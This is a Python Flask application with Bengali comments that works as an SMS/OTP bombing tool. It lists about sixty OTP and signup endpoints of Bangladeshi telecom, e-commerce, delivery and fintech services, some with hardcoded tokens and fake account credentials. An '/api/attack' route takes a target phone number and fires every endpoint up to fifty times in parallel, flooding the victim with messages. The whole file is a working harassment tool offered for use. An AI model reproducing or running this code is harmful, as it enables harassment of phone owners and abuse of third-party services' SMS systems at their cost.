from flask import Flask, render_template, request, jsonify
import requests
import concurrent.futures
import time

app = Flask(__name__)

# ============================================================
#  API কনফিগারেশন (পেলোড ফরম্যাট সহ)
# ============================================================
API_CONFIGS = [
    # 1. Grameenphone
    {"url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "method": "POST", "data": {"msisdn": ""}},
    # 2. Chorki
    {"url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": ""}},
    # 3. Apex
    {"url": "https://api.apex4u.com/api/auth/login", "method": "POST", "data": {"phoneNumber": ""}},
    # 4. Bioscope
    {"url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": ""}},
    # 5. Pickaboo
    {"url": "https://www.pickaboo.com/rest/default/V1/customer-check/exist", "method": "POST", "data": {"mobile": ""}},
    # 6. Bikroy (GET)
    {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "method": "GET", "params": {"phone": ""}},
    # 7. Toffee
    {"url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup", "method": "POST", "data": {"mobile": ""}},
    # 8. Deeptoplay
    {"url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "method": "POST", "data": {"number": ""}},
    # 9. Banglalink Validation (GET)
    {"url": "https://web-api.banglalink.net/api/v1/user/number/validation/", "method": "GET"},
    # 10. Shajgoj
    {"url": "https://api.shajgoj.com/api/v2/auth/send-otp", "method": "POST", "data": {"mobile": ""}},
    # 11. Banglalink Care
    {"url": "https://care.banglalink.net/api/v1/auth/send-otp", "method": "POST", "data": {"msisdn": ""}},
    # 12. Daraz
    {"url": "https://www.daraz.com.bd/customer/api/send_otp", "method": "POST", "data": {"phone": ""}},
    # 13. Foodpanda
    {"url": "https://api.foodpanda.com.bd/api/v1/login/otp", "method": "POST", "data": {"phone": ""}},
    # 14. Osudpotro
    {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "method": "POST", "data": {"phoneNumber": ""}},
    # 15. Paperfly
    {"url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "method": "POST", "data": {"phone_number": ""}},
    # 16. Ghoori
    {"url": "https://api.ghoorilearning.com/api/auth/signup/otp", "method": "POST", "data": {"mobile_no": ""}},
    # 17. Doctime
    {"url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}}},
    # 18. Sundarban
    {"url": "https://api-gateway.sundarbancourierltd.com/graphql", "method": "POST", "data": {"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": ""}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}},
    # 19. Robi
    {"url": "https://webapi.robi.com.bd/v1/send-otp", "method": "POST", "data": {"phone_number": "", "type": "doorstep"}},
    # 20. Redx
    {"url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method": "POST", "data": {"phoneNumber": ""}},
    # 21. Fundesh
    {"url": "https://fundesh.com.bd/api/auth/generateOTP", "method": "POST", "data": {"msisdn": ""}},
    # 22. Motionview
    {"url": "https://api.motionview.com.bd/api/send-otp-phone-signup", "method": "POST", "data": {"phone": ""}},
    # 23. Jatri
    {"url": "https://user-api.jslglobal.co:444/v2/send-otp", "method": "POST", "data": {"phone": "+88", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    # 24. Bikash
    {"url": "https://us-central1-bikash-227008.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}},
    # 25. Shikho
    {"url": "https://api.shikho.com/auth/v2/send/sms", "method": "POST", "data": {"mobile": "", "reason": "LOGIN", "vendor": "shikho"}},
    # 26. Ekshop
    {"url": "https://ekshop.com.bd/v3/api/auth/register-otp", "method": "POST", "data": {"mobile_number": "", "type": "customer", "token": "473c22b102b7ec9992f0ddb853503460"}},
    # 27. Easy
    {"url": "https://core.easy.com.bd/api/v1/registration", "method": "POST", "data": {"name": "Limon Islam", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": "", "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"}},
    # 28. FSIBL
    {"url": "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", "method": "POST", "data": {"AccessToken": "", "TrackingNo": "", "mobileNo": "", "otpSms": "", "product_id": "122", "requestChannel": "MOB", "trackingStatus": 5}},
    # 29. Shomvob
    {"url": "https://api.shomvob.co/api/v2/otp/phone?is_retry=0", "method": "POST", "data": {"phone": ""}},
    # 30. BongoBD
    {"url": "https://apps.bongobd.com/api/v1/auth/otp-login/send-otp", "method": "POST", "data": {"cli": ""}},
    # 31. MCB Affiliate
    {"url": "https://www.mcbaffiliate.com/Affiliate/RequestOTP", "method": "POST", "data": {"PhoneNumber": ""}},
    # 32. MithaiBD
    {"url": "https://mithaibd.com/api/login/?lang_code=en&currency_code=BDT", "method": "POST", "data": {"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": "fuckyoubro@gmail.com", "g_id": "", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": "", "storefront_id": "5"}},
    # 33. EnglishMoja
    {"url": "https://api.englishmojabd.com/api/v1/auth/login", "method": "POST", "data": {"phone": "+88"}},
    # 34. Moveon
    {"url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", "method": "POST", "data": {"phone": "", "login_type": "signup"}},
    # 35. Pathao
    {"url": "https://api.pathao.com/api/v1/auth/request-otp", "method": "POST", "data": {"phone": ""}},
    # 36. Qcoom
    {"url": "https://auth.qcoom.com/api/v1/otp/send", "method": "POST", "data": {"mobileNumber": "+88"}},
    # 37. Circle
    {"url": "https://reseller.circle.com.bd/api/v2/auth/signup", "method": "POST", "data": {"name": "+88", "email_or_phone": "+88", "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"}},
    # 38. Toybox
    {"url": "https://api.toybox.com.bd/v1/auth/request-otp", "method": "POST", "data": {"phone": ""}},
    # 39. RootsEdu
    {"url": "https://rootsedulive.com/api/auth/forget-password", "method": "POST", "data": {"phoneOrEmail": "88"}},
    # 40. Hishabee
    {"url": "https://app.hishabee.business/api/V2/otp/send", "method": "POST", "params": {"mobile_number": ""}},
    # 41. BKShop
    {"url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", "method": "POST", "data": {"phone": "", "email": "", "language": "en"}},
    # 42. MyGP 1
    {"url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp", "method": "GET", "params": {"mobile": "", "otp_type": "REGISTER", "user_type": "PREPAID"}},
    # 43. MyGP 2
    {"url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp", "method": "GET", "params": {"mobile": "", "otp_type": "REGISTER", "user_type": "PREPAID"}},
    # 44. Redx Signup
    {"url": "https://api.redx.com.bd/v1/user/signup", "method": "POST", "data": {"name": "961096106", "phoneNumber": "", "service": "redx"}},
    # 45. Bikroy Cloud
    {"url": "https://us-central1-bikroy-478a5.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"contact_no": ""}},
    # 46. E-Pathagar
    {"url": "https://us-central1-e-pathagar-56b27.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}},
    # 47. Pathao Cloud
    {"url": "https://us-central1-pathao-41616.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "method": "POST", "data": {"country_calling_code": "88", "contact_no": "", "headers": {"PlatForm": "Web"}}},
    # 48. Bikash Web
    {"url": "https://www.bikash.com/send-otp", "method": "POST", "data": {"mobileNumber": ""}},
    # 49. Bikroy API
    {"url": "https://api.bikroy.com/api/v1/auth/send-otp", "method": "POST", "data": {"phone": "", "email": "limon@gmail.com", "password": "boss#2022"}},
    # 50. Shikho API
    {"url": "https://shikho.com/api/v1/auth/send-otp", "method": "POST", "data": {"phone": "", "reason": "login", "vendor": "shikho"}},
    # 51. BongoBD Alt
    {"url": "https://apps.bongobd.com/api/v1/auth/otp-login/send-otp", "method": "POST", "data": {"cli": ""}},
    # 52. Moveon Alt
    {"url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", "method": "POST", "data": {"phone": "", "login_type": "signup"}},
    # 53. Bikash Web Alt
    {"url": "https://www.bikash.com/send-otp", "method": "POST", "data": {"mobileNumber": ""}},
    # 54. MCB Affiliate Alt
    {"url": "https://www.mcbaffiliate.com/Affiliate/RequestOTP", "method": "POST", "data": {"PhoneNumber": ""}},
    # 55. Shomvob Backend
    {"url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", "method": "POST", "data": {"phone": ""}},
    # 56. Sundarban Alt
    {"url": "https://api-gateway.sundarbancourierltd.com/graphql", "method": "POST", "data": {"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": ""}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}},
    # 57. Robi Chat
    {"url": "https://webapi.robi.com.bd/v1/chat/send-otp", "method": "POST", "data": {"phone_number": "", "name": "Johny Singh", "type": "video-chat"}},
    # 58. Robi DA
    {"url": "https://da-api.robi.com.bd/da-nll/otp/send", "method": "POST", "data": {"msisdn": ""}},
    # 59. Banglalink Eshop
    {"url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp", "method": "POST", "data": {"type": "phone", "phone": ""}},
    # 60. Chinaonline
    {"url": "https://chinaonlinebd.com/api/login/getOtp", "method": "GET", "params": {"phone": ""}},
    # 61. Jatri Alt
    {"url": "https://user-api.jslglobal.co:444/v1/send-otp", "method": "POST", "data": {"phone": "+88", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}}
]

# ============================================================
#  রিকোয়েস্ট পাঠানোর ফাংশন
# ============================================================
def send_request(api, phone):
    try:
        url = api["url"]
        method = api.get("method", "POST")
        
        # পেলোড প্রস্তুত
        payload = api.get("data", {}).copy()
        params = api.get("params", {}).copy()
        
        # পেলোডে ফোন বসানো
        def fill_phone(obj):
            if isinstance(obj, dict):
                for key in obj:
                    if isinstance(obj[key], str) and obj[key] == "":
                        obj[key] = phone
                    elif isinstance(obj[key], dict):
                        fill_phone(obj[key])
            return obj
        
        payload = fill_phone(payload)
        params = fill_phone(params)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json"
        }
        
        if method.upper() == "POST":
            response = requests.post(url, json=payload, params=params, headers=headers, timeout=10)
        else:
            response = requests.get(url, params=params, headers=headers, timeout=10)
        
        return {"success": response.status_code in [200, 201, 202, 204], "status": response.status_code}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ============================================================
#  Flask রাউট
# ============================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/attack', methods=['POST'])
def attack():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    amount = data.get('amount', 1)
    
    if not phone or len(phone) < 10:
        return jsonify({"error": "Invalid phone number"}), 400
    
    if amount > 50:
        amount = 50
    
    results = []
    all_logs = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_api = {}
        for _ in range(amount):
            for idx, api in enumerate(API_CONFIGS):
                future = executor.submit(send_request, api, phone)
                future_to_api[future] = (idx, api)
        
        for future in concurrent.futures.as_completed(future_to_api):
            idx, api = future_to_api[future]
            result = future.result()
            result["api_index"] = idx + 1
            result["api_name"] = api.get("name", f"API #{idx+1}")
            results.append(result)
            all_logs.append(result)
    
    success_count = sum(1 for r in results if r.get("success", False))
    total = len(results)
    
    return jsonify({
        "total": total,
        "success": success_count,
        "failed": total - success_count,
        "results": results,
        "logs": all_logs  # রিয়েল-টাইম লগের জন্য
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)